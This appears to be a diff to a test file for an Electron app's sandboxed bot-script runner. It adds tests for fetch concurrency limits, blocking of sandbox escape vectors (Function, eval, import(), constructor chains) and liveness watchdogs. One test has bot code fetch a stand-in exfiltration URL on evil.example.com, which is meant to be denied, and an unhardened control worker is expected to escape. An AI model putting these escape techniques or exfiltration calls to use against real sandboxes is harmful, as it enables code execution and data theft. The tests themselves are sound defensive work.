@@ -16,8 +16,10 @@ vi.mock('../../src/utils/logger', () => ({
 import { compileScript } from '../../electron/runtime/compileScript';
 import { ScriptRunner, type ScriptRunnerOptions } from '../../electron/runtime/ScriptRunner';
 import { scriptFetch } from '../../electron/runtime/scriptFetch';
+import { RpcHandler, MAX_CONCURRENT_FETCHES } from '../../electron/runtime/RpcHandler';
 import { evaluateScript } from '../../electron/runtime/sandbox';
 import { buildWorker, ROOT } from './buildWorker';
+import { escapeProbe, PROBE_ATTEMPTS } from './escapeProbe';
 
 async function compileOk(source: string): Promise<string> {
   const r = await compileScript(source);
@@ -103,6 +105,42 @@ describe('scriptFetch (main side)', () => {
   });
 });
 
+describe('ctx.fetch concurrency', () => {
+  it(`allows at most ${MAX_CONCURRENT_FETCHES} requests in flight per bot and rejects the excess at once`, async () => {
+    const pending: Array<() => void> = [];
+    const fetchImpl = vi.fn(
+      () => new Promise<Response>((resolve) => pending.push(() => resolve(new Response('ok', { status: 200 }))))
+    ) as unknown as typeof fetch;
+    const handler = new RpcHandler({ botId: 'b', botName: 'b', fetchImpl } as never);
+    const req = (i: number) => handler.handle({ id: `r${i}`, method: 'fetch', args: ['https://data-api.polymarket.com/x'] });
+
+    const first = Array.from({ length: MAX_CONCURRENT_FETCHES }, (_, i) => req(i));
+    await new Promise((r) => setTimeout(r, 10));
+    expect(fetchImpl).toHaveBeenCalledTimes(MAX_CONCURRENT_FETCHES);
+
+    const excess = await req(99); // resolves immediately with an error
+    expect(excess.error).toMatch(/too many concurrent requests/);
+    expect(fetchImpl).toHaveBeenCalledTimes(MAX_CONCURRENT_FETCHES);
+
+    pending.splice(0).forEach((f) => f());
+    const done = await Promise.all(first);
+    expect(done.every((r) => r.result && r.result.status === 200)).toBe(true);
+
+    // Slots are released: a new request goes through
+    const again = req(100);
+    await new Promise((r) => setTimeout(r, 10));
+    pending.splice(0).forEach((f) => f());
+    expect((await again).result.status).toBe(200);
+
+    // A different bot (handler) has its own budget
+    const other = new RpcHandler({ botId: 'c', botName: 'c', fetchImpl } as never);
+    const o = other.handle({ id: 'o', method: 'fetch', args: ['https://data-api.polymarket.com/x'] });
+    await new Promise((r) => setTimeout(r, 10));
+    pending.splice(0).forEach((f) => f());
+    expect((await o).result.status).toBe(200);
+  });
+});
+
 describe('script worker', () => {
   let bootstrapPath: string;
   const runners: ScriptRunner[] = [];
@@ -157,7 +195,7 @@ describe('script worker', () => {
     const fetchImpl = vi.fn(async () => new Response('[{"type":"TRADE"}]', { status: 200, headers: { 'Content-Type': 'application/json' } }));
     const code = await compileOk(`
       export async function onStart(ctx) {
-        const g = Function('return this')();
+        const g = globalThis;
         let denied = '';
         try { await ctx.fetch('https://evil.example.com/steal?k=1'); } catch (e) { denied = e.message; }
         const resp = await ctx.fetch('https://data-api.polymarket.com/activity?user=0xabc');
@@ -194,6 +232,63 @@ describe('script worker', () => {
     expect(String(data.denied)).toMatch(/host not allowed: evil\.example\.com/);
     expect(fetchImpl).toHaveBeenCalledTimes(1);
     expect((fetchImpl.mock.calls[0] as unknown[])[0]).toBe('https://data-api.polymarket.com/activity?user=0xabc');
+  });
+
+  it('closes the known escapes (Function, eval, import(), ctx/timer/promise/error constructors, Reflect.construct...)', async () => {
+    const runner = makeRunner(escapeProbe("ctx.emit('escapes', results);"));
+    const ev = nextEvent<{ type: string; data: Record<string, string> }>(runner, 'event');
+    await runner.start();
+    const { type, data } = await ev;
+    expect(type).toBe('escapes');
+    for (const name of PROBE_ATTEMPTS) {
+      expect(data[name], name).toBeDefined();
+      expect(data[name], `${name}: ${data[name]}`).not.toBe('ESCAPED');
+    }
+    // Code generation and import() must actually be refused, not just come back empty
+    for (const name of ['Function', 'newFunction', 'eval', 'indirectEval', 'asyncFnConstructor', 'generatorConstructor',
+      'asyncGeneratorConstructor', 'reflectConstruct', 'globalThisConstructor', 'thisConstructor']) {
+      expect(data[name], name).toMatch(/^blocked: EvalError/);
+    }
+    expect(data.literalImport).toMatch(/^blocked/);
+    expect(data.wasm).toMatch(/^blocked/);
+    for (const name of ['ctxMethodConstructor', 'ctxNestedMethodConstructor', 'ctxCallConstructor', 'ctxProtoConstructor',
+      'ctxConfigConstructor', 'ctxObjectConstructor', 'ctxPromiseConstructor', 'ctxPromiseThenConstructor',
+      'ctxErrorConstructor', 'ctxAsyncFnConstructor', 'timerConstructor', 'timerObjectConstructor', 'consoleConstructor',
+      'reflectConstructCtx']) {
+      expect(data[name], name).toMatch(/^blocked: TypeError/); // constructor is undefined in the worker realm
+    }
+  });
+
+  it('the escape probe detects an escape in an unhardened worker (control)', async () => {
+    // Same probe in a plain worker using the pre-review evaluation (new Function, no vm, no hardening)
+    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'botlab-control-'));
+    const controlPath = path.join(dir, 'control.js');
+    fs.writeFileSync(
+      controlPath,
+      `const { parentPort, workerData } = require('worker_threads');
+       const ctx = {
+         fetch: async () => { throw new Error('denied'); },
+         storage: { get: async () => null },
+         log: { info: () => undefined },
+         binance: { getPrice: async () => null },
+         config: {},
+       };
+       const mod = { exports: {} };
+       new Function('module', 'exports', 'ctx', workerData.code)(mod, mod.exports, ctx);
+       mod.exports.onStart(ctx).then(() => parentPort.postMessage(mod.exports.results));`
+    );
+    const { Worker } = await import('worker_threads');
+    const w = new Worker(controlPath, { workerData: { code: escapeProbe('module.exports.results = results;') } });
+    const results = await new Promise<Record<string, string>>((resolve, reject) => {
+      w.once('message', resolve);
+      w.once('error', reject);
+    });
+    await w.terminate();
+    expect(results.Function).toBe('ESCAPED');
+    expect(results.ctxMethodConstructor).toBe('ESCAPED');
+    expect(results.literalImport).toBe('ESCAPED');
+    expect(results.indirectEval).toBe('ESCAPED');
+    expect(results.globalProcess).toBe('ESCAPED');
   });
 
   it('starts workers with an empty env and heap limits', async () => {
@@ -263,6 +358,38 @@ describe('script worker', () => {
     runner.on('fatal', onFatal);
     await runner.start();
     await new Promise((r) => setTimeout(r, 1200));
+    expect(onFatal).not.toHaveBeenCalled();
+    expect(runner.isRunning).toBe(true);
+  });
+
+  it('liveness: a synchronous loop in a ctx.setInterval callback ends as worker_unresponsive', async () => {
+    const code = await compileOk(`
+      export async function onStart(ctx) {
+        ctx.setInterval(() => { while (true) {} }, 30);
+      }
+    `);
+    const runner = makeRunner(code, { livenessPingMs: 50, livenessTimeoutMs: 300 });
+    const onTimeout = vi.fn();
+    runner.on('tick-timeout', onTimeout);
+    const fatal = nextEvent<{ reason: string; message: string }>(runner, 'fatal');
+    await runner.start();
+    const f = await fatal;
+    expect(f.reason).toBe('worker_unresponsive');
+    expect(onTimeout).not.toHaveBeenCalled(); // the tick watchdog never saw it
+    expect(runner.isRunning).toBe(false);
+  });
+
+  it('liveness: an idle or async-waiting worker keeps answering pings', async () => {
+    const code = await compileOk(`
+      export async function onStart(ctx) {
+        ctx.setInterval(async () => { await new Promise((r) => setTimeout(r, 10_000)); }, 20);
+      }
+    `);
+    const runner = makeRunner(code, { livenessPingMs: 50, livenessTimeoutMs: 200 });
+    const onFatal = vi.fn();
+    runner.on('fatal', onFatal);
+    await runner.start();
+    await new Promise((r) => setTimeout(r, 700));
     expect(onFatal).not.toHaveBeenCalled();
     expect(runner.isRunning).toBe(true);
   });
